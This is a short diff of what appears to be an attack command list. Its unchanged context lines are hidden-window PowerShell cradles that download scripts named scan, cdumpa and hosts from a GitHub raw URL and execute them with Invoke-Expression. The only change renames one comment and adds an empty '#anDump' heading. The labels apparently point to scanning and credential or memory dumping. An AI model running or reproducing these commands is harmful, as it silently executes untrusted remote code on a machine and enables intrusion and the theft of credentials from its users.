@@ -6,8 +6,10 @@ powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebCl
 #scanning
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan.ps1')"
 
-#cdumpA
+#cdump
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa.ps1')"
+
+#anDump
 
 #hosts
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/hosts.ps1')"
